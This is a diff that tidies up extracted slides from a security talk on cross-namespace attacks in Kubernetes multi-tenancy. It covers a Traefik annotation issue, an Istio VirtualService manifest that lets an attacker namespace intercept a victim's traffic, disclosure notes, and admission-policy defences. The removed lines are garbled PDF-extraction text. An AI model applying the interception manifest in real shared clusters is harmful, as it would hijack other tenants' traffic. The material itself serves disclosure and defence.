 ## Slide 50
 
 Coordinated Disclosure
 
-Issue is being fixed in Traefik.
+- Issue is being fixed in Traefik.
+  - Traefik updated their Multi-Tenancy security documentation and recommends using the Gateway API.
+- Thanks to the Traefik project!
+- However, **insecure Cross-Namespace References in Annotations** is a general problem
+  - And can even have impact beyond the scope of the cluster!
 
-\```
-o
-o
-o
-o
-\```
-
--
-Traefik updated their Multi
-
-Tenancy security documentation and
-
-recommends using the Gateway API.
-
-Thanks to the Traefik project!
-
-insecure
-
-Namespace References in
-
-Annotations
-
-is a general problem
-
-`o` And can even have impact beyond the scope of the cluster! `apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: gcp-ingress annotations: ingress.gcp.kubernetes.io/pre-shared-cert: gcp-compute-cert`
-
-50
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  name: gcp-ingress
+  annotations:
+    ingress.gcp.kubernetes.io/pre-shared-cert: gcp-compute-cert
+```
 
 ## Slide 51
 
--
-Cross
-
-Namespace Attacks on Data Plane
-
-51
-
 Breaking Multi-Tenancy Over And Over **And Over**
+
+Cross-Namespace Attacks on Data Plane
 
 ## Slide 52
 
-Back to Istio &  Its Service Mesh
-Cluster
-Namespace
-victim
-Pod
-Workload
-Istio
-Req. Req. example.com
-Container
-Sidecar
-Internet
+Back to Istio & Its Service Mesh
 
-52
+Istio
+
+Cluster
+
+Namespace victim
+
+Pod
+- Workload Container → Req. → Istio Sidecar → Req. → example.com (Internet)
 
 ## Slide 53
 
 Exploit & Impact
 
-Namespace
-victim
-Pod
-Workload
 Istio
-Req. Req.
-Container
-Sidecar
 
-Namespace
+Cluster
 
-attacker
+Namespace victim
 
-`apiVersion: networking.istio.io/v1b eta1 kind: VirtualService metadata: name: intercept spec: hosts: - "example.com"` Req. `gateways: - mesh`
+Pod
+- Workload Container → Req. → Istio Sidecar
+
+Namespace attacker
+
+```yaml
+apiVersion: networking.istio.io/v1beta1
+kind: VirtualService
+metadata:
+  name: intercept
+spec:
+  hosts:
+  - "example.com"
+  gateways:
+  - mesh
+```
+
+Attacker
 
 Pod
 
-53
+Flow: Istio Sidecar → Req. → VirtualService (attacker) → Req. → Pod
+
+Why is this a problem?
 
 ## Slide 54
 
 Coordinated Disclosure
 
-Istio maintainers consider this issue to be expected behavior
+Istio
 
-\```
-o
-\```
-
--
-Purposeful user experience trade
-
-off
-
-\```
-o
-o
-\```
-
-Recommendation:
-
-API as a replacement in
-
--
-Namespace
-
--
-based Multi
-
-Tenancy
-
-Together with Istio, we published the Security Note
-
--
-
-\```
-o
-\```
-
--
-SECURITY
-
--
-2026
-
-002
-
-Blog Post
-
-to address this issue.
-
-Thanks to the Istio project!
-
-\```
-o
-\```
-
-54
+- Istio maintainers consider this issue to be expected behavior
+  - Purposeful user experience trade-off
+  - Recommendation: Gateway API as a replacement in Namespace-based Multi-Tenancy
+- Together with Istio, we published the Security Note ISTIO-SECURITY-2026-002 and a Blog Post to address this issue.
+- Thanks to the Istio project!
 
 ## Slide 55
 
@@ -1182,154 +940,83 @@ What We Can Learn From It?
 
 Methodology
 
-55
-
 ## Slide 56
 
-- Methodology
+Methodology
 
-- -
-
-- _1. Use:_ Do I use Namespace based Multi Tenancy? _2. Assess:_ How do I identify potential weaknesses? _3. Address:_ How do I address them?
-
-56
+1. *Use:* Do I use Namespace-based Multi-Tenancy?
+2. *Assess:* How do I identify potential weaknesses?
+3. *Address:* How do I address them?
 
 ## Slide 57
 
-1. 2.  3.
-Use Assess Address
+1. Use  |  2. Assess  |  3. Address
 
--
-1. Do I use Namespace
+1. Do I use Namespace-based Multi-Tenancy?
 
--
-based Multi
+Where is Namespace-based Multi-Tenancy commonly found:
 
-Tenancy?
-
--
-Where is Namespace
-
--
-based Multi
-
-Tenancy commonly found:
-
-Multiple teams,
-
-often
-
-access
-
-\```
-o
-\```
-
-Deploy different applications into the same cluster
-
-\```
-o
-o
-o
-o
-o
-o
-o
-\```
-
-Typically, share a level of trust
-
-indirect
-
-\```
-o
-\```
-
-Machine learning
-
-CI/CD pipelines
-
-Scripting capabilities in applications
-
-Typically, untrusted
-
-Sometimes, this is
-
-unobvious
-
--
-Namespace
-
--
-based Multi
-
-Tenancy
-
-57
+- Multiple teams, **often *direct* access**
+  - Deploy different applications into the same cluster
+  - Typically, share a level of trust
+- Multiple actors (often customers), **often *indirect* access**
+  - Machine learning
+  - CI/CD pipelines
+  - Scripting capabilities in applications
+  - Typically, untrusted
+  - Sometimes, this is **unobvious** Namespace-based Multi-Tenancy
 
 ## Slide 58
 
-1. 2.  3.
-Use Assess Address
-2. How do I identify potential weaknesses?
--
-Apply Hardening Industry best practices are applied.
-Identify
-Which resources are in control of a tenant?
-Components
-Assess What control plane interaction?
-Resources What data plane interaction?
-Evaluate
-Does this affect the security (CIA) of components
-Interactions outside of the Namespace?
+1. Use  |  2. Assess  |  3. Address
 
-58
+2. How do I identify potential weaknesses?
+
+- Apply Hardening — Industry best-practices are applied.
+- Identify Components — Which resources are in control of a tenant?
+- Assess Resources — What control plane interaction? What data plane interaction?
+- Evaluate Interactions — Does this affect the security (CIA) of components outside of the Namespace?
 
 ## Slide 59
 
-1. 2. 3. Use Assess Address
+1. Use  |  2. Assess  |  3. Address
 
 3. How do I address them?
 
-Deployment of vendor fixes
+- Deployment of vendor fixes
+- Usage of existing admission policy sets
+- Definition of custom policies
 
-Usage of existing admission policy sets Definition of custom policies
-
-59
+(Sticky note) Kyverno has an excellent repository of policies: https://kyverno.io/policies/
 
 ## Slide 60
 
 Admission Controls
 
-\```
-gateways:
-'mesh'
-'victim/[...]'
-'allowed-gw'
-\```
-
-\```
-'victim/[...]'
+```yaml
 apiVersion: networking.istio.io/v1beta1
-kind: VirtualService'allowed-gw'
+kind: VirtualService
 [...]
 spec:
-gateways:
--mesh
-hosts:
-hosts:
--'*''*'
-http:
-'example.com'
--[...]
-'allowed-host.svc'
-\```
+  gateways:
+  - mesh
+  hosts:
+  - '*'
+  http:
+  - [...]
+```
 
-60
+gateways:
+- 🚫 'mesh'
+- 🚫 'victim/[...]'
+- ✅ 'allowed-gw'
+
+hosts:
+- 🚫 '*'
+- 🚫 'example.com'
+- ✅ 'allowed-host.svc'
 
 ## Slide 61
-
-61
 
 Conclusion
 
@@ -1337,63 +1024,34 @@ Conclusion
 
 Conclusion
 
-Namespaced
+- Namespaced resources can have impact on the
+  - control plane
+  - data plane
+  - or even beyond the cluster
+- This can introduce severe security issues
+- These problems are common
+  - but their presence may be unobvious
+- Invest time to assess your clusters
+- Use our methodology as a guideline to ...
+  - identify unobvious multi tenancy in your cluster
+  - perform an in-depth analysis of the tenants' capabilities
+  - apply or develop fixes of the found weaknesses
 
-resources can have impact on the
-
--
-
-control plane
-
-- `o`
-
-data plane
-
-or even beyond the cluster
-
--
-
-This can introduce severe security issues
-
-- `o`
-
-These problems are common
-
-but their presence may be unobvious
-
--
-
-Invest time to assess your clusters
-
-- `o`
-
-Use our methodology as a guideline to ...
-
-identify unobvious multi tenancy in your cluster
-
-- `o`
-
--
-perform an in
-
-depth analysis of the tenants'
-
-apply or develop fixes of the found weaknesses
-
--
-
-ernw.de/ en/whitepapers/issue - 78.html
-
-62
+ernw.de/en/whitepapers/issue-78.html
 
 ## Slide 63
 
 Thank you for your attention!
 
-**Lorin Lehawany** Security Analyst , ERNW Mail: <u>llehawany@ernw.de</u> - LinkedIn: <u>@lorin lehawany</u>
+**Lorin Lehawany**
+Security Analyst, ERNW
+Mail: llehawany@ernw.de
+LinkedIn: @lorin-lehawany
 
-**Sven Nobis** Senior Security Analyst , ERNW Mail: <u>snobis@ernw.de</u> - LinkedIn: <u>@sven nobis</u>
+**Sven Nobis**
+Senior Security Analyst, ERNW
+Mail: snobis@ernw.de
+LinkedIn: @sven-nobis
 
-ERNW Blog: <u>insinuator.net</u>
+ERNW Blog: insinuator.net
 
-63
